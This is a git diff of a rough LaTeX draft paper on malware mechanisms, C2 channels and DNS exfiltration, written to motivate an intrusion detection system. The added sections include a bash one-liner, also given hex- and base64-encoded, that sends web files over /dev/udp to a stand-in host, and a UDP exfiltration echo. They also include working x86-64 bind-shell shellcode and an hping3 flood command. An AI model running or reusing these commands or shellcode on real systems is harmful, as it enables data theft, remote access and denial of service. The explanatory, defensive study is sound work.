@@ -52,7 +52,7 @@ The price tag pertains to the huge amount of systems running windows as a base, 
 
 \section{Historic \& Modern Malware Threats}
 \subsection{Heartbleed}
-A heartbeat request asks for a open ssl session to be checked of a given length and content. The length was never checked though so it would read from outside the buffer potentially revealing passwords. Thousands of webservers were vulnerable, including yahoo. A patch was needed to fix this
+
 
 \subsection{Loveletter}
 
@@ -65,6 +65,8 @@ A heartbeat request asks for a open ssl session to be checked of a given length 
 \subsection{NotPetya}
 
 \subsection{Mimikatz}
+
+\subsection{Mirai}
 
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
@@ -168,7 +170,7 @@ allows for easier expansion. Blacklisting is more suscepitble to hacking due to 
 highly dependant on systems only having required access, something that when planned properly, can use a whitelist approach. The approach will vary across the network and as such proritization of security 
 and looseness of security for usability must be considered.
 
-
+%move to syn?
 \subsection{PoC IDS Objectives (It must..)}
 \begin{enumerate}
 	\item \textbf{Detect network interfaces}
@@ -178,12 +180,11 @@ and looseness of security for usability must be considered.
 	\item \textbf{Control via command switches}
 	\item \textbf{Be well written and meaningful to the idioms of the language}
 	\item \textbf{Have testing/design documentation}
-	
 \end{enumerate}
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
-\chapter{Entry Vectors \& Profiling}
+\chapter{Malware Mechanisms - Entry Vectors \& Profiling}
 \section{Exposure \& Scanning}
 The internet is about freedom of oppotinity, and is why so many companies have succeeded. Services are accessible and convinient. The ability for anyone to access a service is 'double-edged'.
 If anyone is able to access it legitimatly, it allows potential for a threat actor to conduct their processes also. The first prcoess is often enumeration and scanning. Attacks are much more effective when they are meaninful, scoped and targetted.
@@ -249,7 +250,6 @@ citing maintenance as the reason. \citep{AssignmentSecurityForensicsPaper}
 
 
 \subsection{Phishing}
-
 There are two main strands of phishing. The kind you are most likely familiar with is simply called phishing, and pertains to the act of sending a victim to an impersonated site with the intention of them putting real credentials and info down. 
 
 The second being spear phishing which is the same with one main difference. That difference being the scope and scale. A normal phishing attack tends to be widespread, generic and assuming. The spear counterpart prefers to use reconnaissance to tailor make the email into something that fits them. The goal being to exploit some kind of weakness for a higher payoff via privileged users such as CEOs and unsuspecting admins.
@@ -302,7 +302,7 @@ The above approach would depend on the access control system in place. If there 
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
-\chapter{Malware Mechanisms}
+\chapter{Malware Mechanisms - Exploitation}
 
 \section{Command \& Control}
 Malware tradiotnally is static, meaning that it executes a given task and then finishes. Malware that can be maleable is an asset to a cyber criminal. 
@@ -313,22 +313,19 @@ Another reason to use a system such as this is that it creates a layer of pseudo
 
 A few things of note; systems are usually zombies without knowledge through some kind of botnet malware. Additionally, if analysis is conducted of a zombie machine (perhaps an aquisistion of a cloud virtual machine), then the communiccation channel may be clear. Proxy chains can help avoid this, creating more layers of relay.
 
-\subsection{Side Channels}
-\subsubsection{Bind & Reverse Shells}
-A Bind/Remote shell is you connecting from your machine to the shell. This is more of a backdoor. This is usually blocked by firewalls and can be ruined by change of ports, additionally DHCP and NAT cause IPs to change and as a result you do not know the IP of the listener you have setup.
-A reverse shell is the shell connecting to a listening service (Netcat) on your machine.
+\subsection{Side Channels}\label{C2Channels}
+There are two kinds of channels that C2 structures operate in. The first is the heartbeat message. Abstractly, a heartbeat, or also known as a keep-alive message is any transmission that lets the botnet master know that a given bot is alive and well. Details can include time, hostname, IP and other relevant system data. \cite{DNSTunneling}
+Specifics of implementation are covered in the DNS Exfiltration section. One of the nuiances for variability here is how bots are distinguished from one another, an example is given later. \ref{DNSHeartbeat}
 
-Netcat lets us set up connections between a host and a listener. You can also connect to any listener that is not yours also, which is referred to as banner grabbing, simply using nc on a ip port can do this. 
-A useful. 
-
-Let’s say we have found a remote code execution (RCE) vulnerability on the target host. We can than issue the Netcat command with –e on the target host and initiate a reverse shell with Netcat to issue commands.
-
-MSFVenom
-
-Reverse shells can be over TLS
-
-%reference zeus, mirai
-%pwncat - bit noisy tho
+The second are control messages. Again, the implementation is covered in the DNS section \ref{DNSControl} but from a top down view, they use variable data to distinguish between instructions. These instructions are referenced using pseudo 'OPCodes' of which reflect an action. \cite{DNSTunneling}
+Actions could include but are not limited to :
+\begin{enumerate}
+    \item Downloading a remote payload
+    \item Uploading sensitive data from the victim's machine
+    \item Serving a reverse shell
+    \item Conduct denial of service activity
+    \item Wipe malware and traces
+\end{enumerate}
 
 
 \subsection{Denial of Service}
@@ -356,6 +353,24 @@ The point being is that Denial of Service alone is a type of attack rather than 
 \citep{AssignmentDOSPaper}
 
 
+\section{Bind & Reverse Shells}
+A Bind/Remote shell is you connecting from your machine to the shell. This is more of a backdoor. This is usually blocked by firewalls and can be ruined by change of ports, additionally DHCP and NAT cause IPs to change and as a result you do not know the IP of the listener you have setup.
+A reverse shell is the shell connecting to a listening service (Netcat) on your machine.
+
+Netcat lets us set up connections between a host and a listener. You can also connect to any listener that is not yours also, which is referred to as banner grabbing, simply using nc on a ip port can do this. 
+A useful. 
+
+Let’s say we have found a remote code execution (RCE) vulnerability on the target host. We can than issue the Netcat command with –e on the target host and initiate a reverse shell with Netcat to issue commands.
+
+MSFVenom
+
+Reverse shells can be over TLS
+
+%reference zeus, mirai
+%pwncat - bit noisy tho
+
+
+
 \section{Data Cryptors}
 Data is our most valuable asset, with much of it being irreplaceable. This is true for both home and corporate users of technology. There is no feasible retaking of a deceased loved one's photo, or the reaqussition of millions of customer records. This is the sad reality of what data cryptors target.
 There are two main motivations for an attack of this kind, one in which access to given data is removed, often permenantly. 
@@ -368,6 +383,90 @@ Secondly, encryption for destruction. From time to time there are attacks that a
 %prove claim of the value of data
 
 \section{Buffer Overflows}
+Programs rely on storage and variability. A program that steps through in the exact same way is not always what is needed to solve a given problem. Standard input allows for programs to change at runtime, often with conditional statements. Input does have a limit however, which depends on the data type and system architecture.
+If input exceeds the limits of it's 'box' in memory, the program becomes unstable. It can lead to the user the program is running under causing change or unintended action on the machine, by injecting a very specific payload that will overload the buffer and achieve a given task, such as a reverse shell. This is the result of not validating
+buffer size, using C methods like strcpy. \citep{strcpy}
+
+Strcpy() takes two arguments, destination and source. There is no built in limitation on how much it stores, and is therefore vulnerable. It is particually vulnerable because this is in conjuction with variable values, which are often dictated by user input. 
+
+A better solution would be to use strncpy. \citep{strncpy} It takes an extra argument which ensures that the copied string can only be a given length from the source. Newer versions of strcpy have protections, but it is entirely dependant on the one used. \citep{strcpy}
+
+\begin{tcblisting}{listing only}
+Insecure:
+strcpy(var2, var1);
+
+More secure:
+strncpy(var2, var1, sizeof(var2)); 
+\end{tcblisting}
+
+This is a very in depth topic, that is somewhat out of scope beyond this.
+
+
+\section{Payload vs Shellcode}
+Malware is nothing without some form of code execution. Program code allows for malcious actors to conduct a given task, however, this cannot always be baked into the malware itself.
+It is common for malware to follow 'stager' behaviour,  it would download the majority of the malcious code from a remote server. Another avenue is for the malware 'payload' to be obfuscated, compressed and then
+injected into a victim by exploiting a given vulnerability. The payload is then executed, and any number of results can come of it. Payloads often come under a few categories:
+
+%cite encoding and obfuscation, and exfil for part
+
+\begin{lstlisting}[label=payload,caption=Explicit HTML Scraper Payload]
+
+cd /var/www/html; find . -type f -exec cat {} \; > /dev/udp/example.com/80;
+
+Payload (Hex & Base64):
+\x63\x64\x20\x2f\x76\x61\x72\x2f\x77\x77\x77\x2f\x68\x74\x6d\x6c\x3b\x20\
+x66\x69\x6e\x64\x20\x2e\x20\x2d\x74\x79\x70\x65\x20\x66\x20\x2d\x65\x78\x
+65\x63\x20\x63\x61\x74\x20\x7b\x7d\x20\x5c\x3b\x20\x3e\x20\x2f\x64\x65\x7
+6\x2f\x75\x64\x70\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x38
+\x30\x3b
+
+Y2QgL3Zhci93d3cvaHRtbDsgZmluZCAuIC10eXBlIGYgLWV4ZWMgY2F0IHt9IFw7ID4gL2Rld
+i91ZHAvZXhhbXBsZS5jb20vODA7
+
+\end{lstlisting}
+
+Shellcode does come under the payload banner, but is a term used to describe code that returns an interactive terminal session to the threat actor. This means they can execute code at their discretion.
+Payloads often are shellcode in nature, because of the discussed benefits of variable input. Shells vary on system architecture, often coming under Bash or Powershell for their respective operating systems.
+Architecture matters, for both when you are giving explicit shell instructions and when you are injecting an executable shell. 
+
+The difference being that the former relies on the target shell being present, and leveraging it to
+grant a reverse shell, and the latter injecting a malicous shell program that has no prerequesites beyond the architecture it is designed to work on.
+
+A fine example is below \citep{x86Shellcode}:
+\begin{lstlisting}[label=x86Shellcode,caption=x86 Shellcode Example]
+#include <stdio.h>
+  
+#define PORT "\x7a\x69" /* 31337 */
+  
+unsigned char code[] = \
+"\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a"
+"\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0"
+"\x4d\x31\xd2\x41\x52\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24\x02"
+PORT"\x48\x89\xe6\x41\x50\x5f\x6a\x10\x5a\x6a\x31\x58\x0f\x05"
+"\x41\x50\x5f\x6a\x01\x5e\x6a\x32\x58\x0f\x05\x48\x89\xe6\x48\x31"
+"\xc9\xb1\x10\x51\x48\x89\xe2\x41\x50\x5f\x6a\x2b\x58\x0f\x05\x59"
+"\x4d\x31\xc9\x49\x89\xc1\x4c\x89\xcf\x48\x31\xf6\x6a\x03\x5e\x48"
+"\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a"
+"\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54"
+"\x5f\x6a\x3b\x58\x0f\x05";
+ 
+int
+main(void)
+{
+    printf("Shellcode Length: %d\n", (int)sizeof(code)-1);
+    int (*ret)() = (int(*)())code;
+    ret();
+    return 0;
+}
+
+\end{lstlisting}
+
+The above code is a proof of concept from www.shell-storm.org. It illustrates that not only can explicit shell instructions be encoded, but that linux binary code can be as well.
+The example simply describes the shellcode, but in reality would be injected using a relevant exploit, and would then return a shell once executed. 
+
+If found in industry, the differences can be shown via meaninful output between normal decoders and running it through a x86 disassembler. 
+Typical reverse engineering methods could then be conducted to find the true purpose of the payload. The specifics of static binary analysis, is beyond the scope of this paper. Instead the focus is
+on dynamic behaviourial analysis.
 
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
@@ -399,7 +498,7 @@ It does not use a key, and is therefore the same each time. Any system that is r
 Encryption is the prcoess of producing cipher text from a given input dataset, using a specifided algorithm that provides different output for every key. The key is the important part here,
 while the process is reversable, it requires a key that is outside of the parameters of the static algorithm. This does a great deal for security abstractly, but very much depends on the algorithm and key size used.
 
-\begin{lstlisting}[label=EncodingVsEncryption,captionEncoding vs Encryption]
+\begin{lstlisting}[label=EncodingVsEncryption,caption=Encoding vs Encryption]
 Command =  hping3 -c 10000 -d 120 -S -w 64 -p 21 --flood --rand-source www.hping3testsite.com
 
 To Base64
@@ -443,6 +542,7 @@ known activities regardless of hash, and look at decrypted memory.
 
 This can be defeated (like everything), by having abrupt delays to throw the system off, lets say before and after decrypting, or overloading memory with junk to throw it off
 
+
 %------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------%
 
 \chapter{Malware Mechanisms - Exflitration}
@@ -451,16 +551,31 @@ In C2 structures, it is often advantagous for communciations to be covert and un
 
 Data can be pushed over the network, usually in the form of UDP or TCP traffic. 
 
-\begin{lstlisting}[label=EncodingVsEncryption,captionEncoding vs Encryption]
-    echo "d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4855bc048efbbd97192a46baaecbbac
-    55073b72766c25faf90da1c5f386dc1201451b6e5576798a24399885112ff1684fa4ac31a1161d72ad66f
-    44ebbaebd05e727f362e15f30315" > /dev/udp/malicious.example.com/80
+\begin{lstlisting}[label=UDPPackets,caption=UDP over Bash]
+    echo "d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4
+    855bc048efbbd97192a46baaecbbac55073b72766c25faf90da1c5f
+    386dc1201451b6e5576798a24399885112ff1684fa4ac31a1161d72
+    ad66f44ebbaebd05e727f362e15f30315" > /dev/udp/malicious.example.com/80
 \end{lstlisting}
 %maybe put image in?
 
 In the above string, the previously encrypted string is sent over the network using bash's network device. UDP on port 80 was chosen for our example server
 
 The above string is enrcypted at rest, but another layer at transit would be ideal to obfuscate the traffic's purpose.
+
+
+\section{TLS}
+Transport Layer Security, and formally Secure Socket Layer (obselte since 1999 when TLS evolved from it) are protcols to encrypt data cryptographically in transit. It's use typically applies to client to server communication. It ensures that while transmitting through potentially insecure nodes of the internet, data is secured and non sensicle to those who potentially have a network tap to view transmission contents. This is extreamly important for communications that are sensitive in nature such as emails and voice communications. \citep{CloudflareTLS}
+
+TLS is ultimately a layer for other protocols to plug into, to push their traffic through, with the other side agreeing to decrypt it in the same way. For example, there is HTTPS, HTTP over TLS. The cryptographic protocol must be agreed upon, as must the decryption key. This is done during the TLS handshake, except without an explicit key as that would be insecure to push over the network in clear text. \citep{CloudflareTLS}
+
+PGP encryption is a popular choice for this, it provides an effective way of maintaining confidentiality and integrity. Each host has a private key only known to them, each also have a public key based on that private key given to anyone who wants it. This is known as asymmetric encryption. When data is asymmetric, private key encrypted data can only be decrypted by the public key of the other side, and vise versa.  
+
+As noted, integrity can be assured with this method. This is especially important in two settings. The first being infrastructure validation, in which server A and B want to ensure they are talking to each other, and not an inpersonator whom wouldn't have the same public key. The second being the validation of websites, particually the ones of high traffic. Often these sites have to handle sensitive infoirmation, and so clearly there is a need for them to prove they are who they are. They use the TLS and PGP process to develop certificates that are given to the browser who then automatically check with certificate authorities (CAs) to ensure they are the real deal. Challenges are oftne given to the domain servers holding a given ceritifciate that only they can complete.
+
+It is clear that TLS can be used for great purpose, to ensure data can be hidden from those it was not intended for, which helps prevent cyber crime known as man-in-the-middle attacks. A commonality in security is that both sides often use the same tools for different purposes. TLS unfortunalty can be used to encrypt C2 
+channels to make them even more covert in transit. This is due to the flexibility of TLS, along with how computers handle data indiscriminately. Domains are cheap, and registering one for malicous purposes is common place in the criminal world. \citep{TLS}
+
 
 \section{Geo Location Altering}
 As discussed, it is important to conceal the location of the real attacker. It is common in a C2 structure for zombie machines in the botnet to conduct the attacks. This in essence is a proxied attack,
@@ -489,7 +604,7 @@ memorable way, as well as allowing for variability in infrastructure deployments
 then the client needs not change anything, and so less configuration is needed long term. Another point to make is that this allows for a round robin approach to load balancing where a given domain name resolves to different IP addresses providing the
 same service which evens the workload. 
 
-DNS is commonly used on most networks, as it provides an intregal part in most interaction, human and programs alike. The assumption that DNS would be on practically any network can be used in an adversarie's favour; DNS is not often monitored to the degree it should be.
+DNS is commonly used on most networks, as it provides an integral part in most interaction, human and programs alike. The assumption that DNS would be on practically any network can be used in an adversarie's favour; DNS is not often monitored to the degree it should be.
 DNS allows for fairly covert channels to transport data, that if done well, can bypass firewall and IDS/IPS systems. A C2 structure can be formed through this communication.
 
 An abstract from a relevant paper \citep{DNSExfiltration}: 
@@ -522,19 +637,109 @@ the request and reconstructs it into the original format."
 
 \vspace*{1in}
 
+\subsubsection{DNS Subdomain Manipulation}
 
-There are tools capable of conducting such an technique; these include:
+DNS requests and responces are used to transport data convertly. To a greater depth, this is accomplished via the ability to append a subdomain to a registered domain.
+DNS traffic is routed through infrastructure until it hits the authoritative server that is malicous, the logs are read and the data is stolen. Data is often compressed, 
+encoded and something even encrypted to fit into the of the domain field up to the UDP limit (look into it). \citep{DNSTunneling} Data transmitted this way is difficult to spot, and meaningless 
+if found without context. The DNS server can either be threat actor controlled or hijacked infrastructure. Firewall rules allowing only certain IP addresses to access domains can
+be bypassed with UDP IP spoofing, where a complete whitelist approach of approved domain names would be ideal. \citep{DNSSpoof&Exfil}
+
+%go back over notes, I will have missed stuff
+
+For example:
+\begin{tcblisting}{listing only}
+    d15304958943bc2190ab10bbca29a6c0171e5af4347d3c4a4855bc
+    048efbbd97192a46baaecbbac55073b72766c25faf90da1c5f386d
+    c1201451b6e5576798a24399885112ff1684fa4ac31a1161d72ad6
+    6f44ebbaebd05e727f362e15f30315.malicousServer.net
+\end{tcblisting}
+
+In reality. this can be improved upon. The above subdomain is long, and so splitting it up would look much less suspicuous. The ability to know something is suspicuous is
+still dangerous to an adversary.
+
+Much better:
+\begin{tcblisting}{listing only}
+    d15304958943bc2190ab10bbca2.malicousServer.net
+    9a6c0171e5af4347d3c4a4855bc.malicousServer.net
+    048efbbd97192a46baaecbbac55.malicousServer.net
+    073b72766c25faf90da1c5f386d.malicousServer.net
+    c1201451b6e5576798a24399885.malicousServer.net
+    112ff1684ff1684fa4ac31a1161.malicousServer.net
+    d72ad66f44ebbaebd05e727f362.malicousServer.net
+    e15f30315.malicousServer.net
+\end{tcblisting}
+
+\subsubsection{DNS Tunneling}
+There are multiple vectors in the DNS protocol to attach meaningful variance; 
+The domain name itself that is attempted to be resolved as discussed, using common queries such as A or AAAA and tunneling other protocols as payloads
+through the query payload of the DNS query. Depending on the throughput needed, the requests can be segmented to be more covert, as tunneling 
+high bandwidth protocols through DNS can be quite loud in respective to detection software. \citep{DNSExfiltration} Common tunneled protocols include
+SSH, HTTP and HTTPS. SSH and HTTPs have the benefit of having obfuscation in encryption, rather than just hiding http downloads in clear text encoded base64 \citep{DNSTunneling}
+
+%show encoded http request under DNS
+
+\subsubsection{DNS Infiltration}
+
+Another place to insert data is in a TXT responce; If a NOERROR (Maybe explain more) TXT request is initated by the victim (it would normally be NXDOMAIN), 
+then the responder has the ability to insert data into the descriptive field. This is normally a field for contact information such as telephone number and email.
+The space here is much larger, allowing for 300 characters which is plenty for a compressed executable payload. This would be considered infiltration, and provides alternate options. \citep{DNSTunneling}
+
+\subsubsection{DNS Heartbeating}\label{DNSHeartbeat}
+As discussed in earlier sections of the paper, messages are sent to verify connectivity and system availablity, often with identifiable information. \ref{C2Channels}
+
+DNS has this capability, as so long as targeted detection or whitelists are not in place, DNS can eventually push any amount of data through infrastructure to the centralized server. This allows for a level of creatvity for how to solve problems.
+The C2 master may have many victim machines connecting to it at once, how may it distinguish between them, while using DNS?
+
+Paloaltonetworks came up with an effective strategy, specific sections of data can be encoded into base64, and then pieced together and appended as a subdomain as discussed earlier. \citep{DNSTunneling}
+
+\begin{lstlisting}[label=HostEncoding,caption=Encoding Of Identifiers Into A DNS Request]
+Sample Nomenclature:
+IP, OS, Location, Username, Hostname, UUID
+
+145.222.1.56 = MTQ1LjIyMi4xLjU2
+Windows7 : NTFOLTAuMVc=
+John Doe : Sm9obiBEb2U=
+DB_SVR : REJfU1ZS
+532e4d42-2de2-4489-8761-9f0bc329652e :
+NTMyZTRkNDItMmRlMi00NDg5LTg3NjEtOWYwYmMzMjk2NTJl
+
+Delimiter = '
+
+MTQ1LjIyMi4xLjU2'V2luZG93czc='NTFOLTAuMVc='Sm9obiBEb2U='REJfU1ZS
+'NTMyZTRkNDItMmRlMi00NDg5LTg3NjEtOWYwYmMzMjk2NTJl.malicousServer.net
+\end{lstlisting}
+
+Varying length could be an issue, delimiation would solve this. A character that does not need to be escaped in base64 or DNS, but that is covert aesthetically would is ideal, such as the apostraphe used above. 
+This is an area that has scope for improvement.
+
+\subsubsection{DNS C2 Control}\label{DNSControl}
+The identifiers above allow the botnet master to provide responces conditionally based on request sender and content. DNS inherintly resolves domain names to addresses, this is another potential attack vector.
+In the cases shown, the IP responce is not needed or not even read by the victim. The DNS requests are abitrary and serve to deliver data, rather than the intended purpose of being a mechanism for other protocols to work.
+This means that the IP address returned can be leveraged to hold a different meaning. These attacks assume control of a DNS server, and as a result what addresses are returned. \citep{DNSTunneling}
+
+Assuming we are using IPv4, there are 4,294,967,296 possible addresses. This means in turn that we have the same amount of potential commands, by assuming them as unique identifiers for commands. \citep{DNSTunneling}
+
+Using the earlier actions as an example \ref{C2Channels}:
+\begin{lstlisting}[label=DNSOPCodes,caption=Psuedo DNS OPCoding via IP resolution]
+10.10.10.1 = Downloading a remote payload
+10.10.10.2 = Uploading sensitive data from the victim's machine
+10.10.10.3 = Serving a reverse shell
+10.10.10.4 = Conduct denial of service activity 
+10.10.10.5 = Wipe malware and traces
+\end{lstlisting}
+
+%can put more detail if needed, txt switching etc..
+
+\subsubsection{DNS Manipulative Tools}
+There are tools capable of conducting such techniques; these include:
 \begin{enumerate}
     \item DnsCat2 - "This tool is designed to create an encrypted command-and-control (C&C) channel over the DNS protocol" \citep{dnscat2}
     \item DNSExfiltrator - "Allows for transfering a file over a DNS request covert channel." \citep{DNSExfiltrator}
     \item Iodine - "IP over DNS tunneling client" \citep{iodine}
     \item DET - "Data Exfiltration Toolkit" \citep{DET}
 \end{enumerate}
-
-There are multiple vectors in the DNS protocol to attach meaninful variance; 
-The domain name itself that is attempted to be resolved, using common queries such as A or AAAA and tunneling other protocols 
-through the data payload of the DNS query. Depending on the throughput needed, the requests can be segmented to be more covert, as tunneling 
-SSH through DNS can be quite loud in respective to detection software. \citep{DNSExfiltration}
+NotI
 
 %good table for tools
 %snort apparenlty has lists for certain kinds of malicous traffic, including thism, sometimes with regex (snort)
@@ -552,20 +757,6 @@ The latter relies on fields within the protocol having storage capacity for vari
 
 Ping can be leveraged to specify it's 16 byte ECHO\_REQUEST field's contents. The source states that a simple Scapy Python script can be used in combination with timing and payload switches of the ping utility, to exfiltrate data under the ICMP protocol. This relies on compression of data into hexadecimal, and to then sneak that into intervaled bytes that the listener/sniffer on the malicous server will then strip and write to a file. \citep{pingExfil}
 %would be good to try out!
-
-
-
-\subsection{TLS}
-Transport Layer Security, and formally Secure Socket Layer (obselte since 1999 when TLS evolved from it) are protcols to encrypt data cryptographically in transit. It's use typically applies to client to server communication. It ensures that while transmitting through potentially insecure nodes of the internet, data is secured and non sensicle to those who potentially have a network tap to view transmission contents. This is extreamly important for communications that are sensitive in nature such as emails and voice communications. \citep{CloudflareTLS}
-
-TLS is ultimately a layer for other protocols to plug into, to push their traffic through, with the other side agreeing to decrypt it in the same way. For example, there is HTTPS, HTTP over TLS. The cryptographic protocol must be agreed upon, as must the decryption key. This is done during the TLS handshake, except without an explicit key as that would be insecure to push over the network in clear text. \citep{CloudflareTLS}
-
-PGP encryption is a popular choice for this, it provides an effective way of maintaining confidentiality and integrity. Each host has a private key only known to them, each also have a public key based on that private key given to anyone who wants it. This is known as asymmetric encryption. When data is asymmetric, private key encrypted data can only be decrypted by the public key of the other side, and vise versa.  
-
-As noted, integrity can be assured with this method. This is especially important in two settings. The first being infrastructure validation, in which server A and B want to ensure they are talking to each other, and not an inpersonator whom wouldn't have the same public key. The second being the validation of websites, particually the ones of high traffic. Often these sites have to handle sensitive infoirmation, and so clearly there is a need for them to prove they are who they are. They use the TLS and PGP process to develop certificates that are given to the browser who then automatically check with certificate authorities (CAs) to ensure they are the real deal. Challenges are oftne given to the domain servers holding a given ceritifciate that only they can complete.
-
-It is clear that TLS can be used for great purpose, to ensure data can be hidden from those it was not intended for, which helps prevent cyber crime known as man-in-the-middle attacks. A commonality in security is that both sides often use the same tools for different purposes. TLS unfortunalty can be used to encrypt C2 
-channels to make them even more covert in transit. This is due to the flexibility of TLS, along with how computers handle data indiscriminately. Domains are cheap, and registering one for malicous purposes is common place in the criminal world. \citep{TLS}
 
 %could talk deeper on the process
 %reference exfiltration  by obfuscation - twiiter bot
@@ -674,6 +865,8 @@ We can use command injection to run any command that user has available. This ma
 Proper input validation on the entry point.Lack of access that the web application has to system commands, as well as up the date packages of the languages that have this vulnerable. There is no reason that netcat should be on a target system. 
 The following is possible otherwise. We could use this attack in a input that runs a command, we end the command and run another as that user, in this case popping a shell for us to run commands more easily ourselves.
 
+%an example?
+
 \subsection{Scheduler Manipulation}
 Linux systems use cron, and windows systems use task scheduler. They both allow for administrators to automate tasks. The use case is usually for an on-boot task, or perodically ran for backups and other important jobs.
 THey save the administrator from having to run it manually, leaving them to do other jobs. They are invaluable for backup hygiene, as well as autostarting important programs. While these schedulers can run single commands, 
@@ -711,8 +904,9 @@ A user account could be hijacked, and then attempt to write to a scheduled scrip
 %consider empty sections and subsections that only host children
 
 %sections to do:
-%malware examples
 %priv esc techniques
-%buffer overflows
+%icmp exfil
+%malware examples
 
 %look at other notes
+%go through and reference/cite later and earlier content, particually in the malware sections
